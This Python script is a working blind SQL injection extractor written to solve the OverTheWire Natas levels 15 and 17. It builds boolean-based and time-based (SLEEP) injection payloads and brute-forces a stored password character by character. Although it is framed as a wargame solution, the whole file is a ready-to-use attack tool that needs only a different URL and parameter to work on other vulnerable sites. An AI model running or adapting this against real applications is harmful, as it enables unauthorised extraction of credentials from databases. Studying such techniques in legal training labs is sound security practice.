#!/usr/bin/env python3
"""
blind_sqli_extractor.py

Solves OverTheWire Natas:
- natas15: boolean-based blind SQLi (checks for "This user exists.")
- natas17: time-based blind SQLi (uses SLEEP() timing)

Examples:
  # Natas 15 -> extract natas16 password
  python3 blind_sqli_extractor.py --level 15 \
    --url https://natas15.natas.labs.overthewire.org/ \
    --auth-user natas15 --auth-pass '<NATAS15_PASS>' \
    --target-user natas16

  # Natas 17 -> extract natas18 password
  python3 blind_sqli_extractor.py --level 17 \
    --url https://natas17.natas.labs.overthewire.org/ \
    --auth-user natas17 --auth-pass '<NATAS17_PASS>' \
    --target-user natas18

Requires:
  pip install requests
"""

from __future__ import annotations

import argparse
import string
import sys
import time
from dataclasses import dataclass
from typing import Optional, Tuple

import requests


DEFAULT_CHARSET = string.ascii_letters + string.digits  # Natas passwords are typically [A-Za-z0-9]


@dataclass
class Config:
    level: int
    url: str
    auth_user: str
    auth_pass: str
    target_user: str
    method: str
    param: str
    length: int
    charset: str
    sleep_s: float
    timeout_s: float
    retries: int
    verbose: bool


def normalize_base_url(url: str) -> str:
    url = url.strip()
    if not url.endswith("/"):
        url += "/"
    return url


def http_request(
    cfg: Config,
    username_payload: str,
) -> Tuple[str, float, int]:
    """
    Sends either POST or GET to the level URL, providing cfg.param=username_payload.
    Returns (response_text, elapsed_seconds, status_code).
    """
    auth = (cfg.auth_user, cfg.auth_pass)
    data = {cfg.param: username_payload}

    t0 = time.perf_counter()
    try:
        if cfg.method.upper() == "GET":
            r = requests.get(cfg.url, params=data, auth=auth, timeout=cfg.timeout_s)
        else:
            r = requests.post(cfg.url, data=data, auth=auth, timeout=cfg.timeout_s)
    except requests.RequestException as e:
        # For time-based (natas17), timeouts can be informative if you set sleep too large.
        # We'll rethrow and let caller handle retries.
        raise e
    elapsed = time.perf_counter() - t0
    return r.text, elapsed, r.status_code


def build_payload_boolean(target_user: str, pos: int, ch: str) -> str:
    """
    Boolean-based condition:
      username = "<target_user>" AND BINARY SUBSTRING(password,<pos>,1)='<ch>' -- -
    """
    # NOTE: The surrounding query is: ... username="<INPUT>"
    # We close the quote, inject, then comment out the remainder.
    return (
        f'{target_user}" AND BINARY SUBSTRING(password,{pos},1)=\'{ch}\' -- -'
    )


def build_payload_time(target_user: str, pos: int, ch: str, sleep_s: float) -> str:
    """
    Time-based condition:
      username = "<target_user>" AND IF(BINARY SUBSTRING(password,<pos>,1)='<ch>', SLEEP(<sleep>), 0) -- -
    """
    # Keep sleep to a decimal with limited precision for readability
    sleep_str = f"{sleep_s:.3f}".rstrip("0").rstrip(".")
    return (
        f'{target_user}" AND IF(BINARY SUBSTRING(password,{pos},1)=\'{ch}\', SLEEP({sleep_str}), 0) -- -'
    )


def is_true_natas15(response_text: str) -> bool:
    return "This user exists." in response_text


def calibrate_baseline(cfg: Config) -> float:
    """
    Baseline for natas17 timing: measure a few benign requests and take the median-ish average.
    """
    samples = []
    benign = cfg.target_user  # no injection
    for _ in range(max(3, min(7, cfg.retries + 2))):
        _, elapsed, _ = http_request(cfg, benign)
        samples.append(elapsed)
        time.sleep(0.05)
    samples.sort()
    # trimmed mean around the middle
    mid = samples[len(samples) // 2]
    return mid


def test_char(cfg: Config, pos: int, ch: str, baseline: Optional[float], threshold: Optional[float]) -> bool:
    """
    Returns True if password[pos] == ch.
    - For level 15: checks response body text
    - For level 17: checks timing delta (elapsed > threshold)
    """
    last_err = None

    for attempt in range(cfg.retries):
        try:
            if cfg.level == 15:
                payload = build_payload_boolean(cfg.target_user, pos, ch)
                text, _, status = http_request(cfg, payload)
                if cfg.verbose:
                    print(f"[15] pos={pos:02d} ch={ch!r} status={status}")
                return is_true_natas15(text)

            if cfg.level == 17:
                assert baseline is not None and threshold is not None
                payload = build_payload_time(cfg.target_user, pos, ch, cfg.sleep_s)
                _, elapsed, status = http_request(cfg, payload)
                if cfg.verbose:
                    print(f"[17] pos={pos:02d} ch={ch!r} status={status} elapsed={elapsed:.3f}s thr={threshold:.3f}s")
                return elapsed > threshold

            raise ValueError("Unsupported level (use 15 or 17).")

        except requests.RequestException as e:
            last_err = e
            # brief backoff
            time.sleep(0.1 + 0.1 * attempt)

    if cfg.verbose and last_err is not None:
        print(f"[!] request failed after {cfg.retries} retries at pos={pos} ch={ch!r}: {last_err}", file=sys.stderr)
    return False


def extract_password(cfg: Config) -> str:
    baseline = None
    threshold = None

    if cfg.level == 17:
        baseline = calibrate_baseline(cfg)
        # Decision rule: if we sleep cfg.sleep_s on true, treat "true" when elapsed is well above baseline.
        # Using 60% of sleep as cushion helps with jitter.
        threshold = baseline + (cfg.sleep_s * 0.60)
        if cfg.verbose:
            print(f"[*] baseline={baseline:.3f}s sleep={cfg.sleep_s:.3f}s threshold={threshold:.3f}s")

    extracted = []
    for pos in range(1, cfg.length + 1):
        found = None
        for ch in cfg.charset:
            if test_char(cfg, pos, ch, baseline, threshold):
                found = ch
                extracted.append(ch)
                print(f"[+] pos {pos:02d}: {ch}    => {''.join(extracted)}")
                break

        if found is None:
            # If this happens, widen charset or adjust sleep/threshold (natas17) or ensure injection works.
            print(f"[!] No match at position {pos}. Current: {''.join(extracted)}", file=sys.stderr)
            break

    return "".join(extracted)


def parse_args() -> Config:
    p = argparse.ArgumentParser(description="Blind SQLi extractor for OverTheWire Natas 15 and 17.")
    p.add_argument("--level", type=int, choices=[15, 17], required=True, help="Natas level (15 or 17)")
    p.add_argument("--url", required=True, help="Base URL to the level (e.g. https://natas15.natas.labs.overthewire.org/)")
    p.add_argument("--auth-user", required=True, help="HTTP Basic Auth username (e.g. natas15)")
    p.add_argument("--auth-pass", required=True, help="HTTP Basic Auth password")
    p.add_argument("--target-user", required=True, help="DB username to extract password for (e.g. natas16 / natas18)")

    p.add_argument("--method", choices=["POST", "GET"], default="POST", help="HTTP method to send username param")
    p.add_argument("--param", default="username", help="Parameter name (default: username)")

    p.add_argument("--length", type=int, default=32, help="Password length to extract (default: 32)")
    p.add_argument(
        "--charset",
        default=DEFAULT_CHARSET,
        help="Characters to try (default: ascii letters + digits)",
    )

    p.add_argument("--sleep", dest="sleep_s", type=float, default=0.8, help="SLEEP seconds for natas17 (default: 0.8)")
    p.add_argument("--timeout", dest="timeout_s", type=float, default=10.0, help="HTTP timeout seconds (default: 10)")
    p.add_argument("--retries", type=int, default=3, help="Retries per guess (default: 3)")
    p.add_argument("--verbose", action="store_true", help="Verbose request logging")

    a = p.parse_args()

    url = normalize_base_url(a.url)

    return Config(
        level=a.level,
        url=url,
        auth_user=a.auth_user,
        auth_pass=a.auth_pass,
        target_user=a.target_user,
        method=a.method,
        param=a.param,
        length=a.length,
        charset=a.charset,
        sleep_s=a.sleep_s,
        timeout_s=a.timeout_s,
        retries=a.retries,
        verbose=a.verbose,
    )


def main() -> int:
    cfg = parse_args()
    print(f"[*] Extracting password for user={cfg.target_user} on natas{cfg.level} ...")
    pw = extract_password(cfg)
    print("\n==== RESULT ====")
    print(pw)
    return 0 if len(pw) == cfg.length else 1


if __name__ == "__main__":
    raise SystemExit(main())
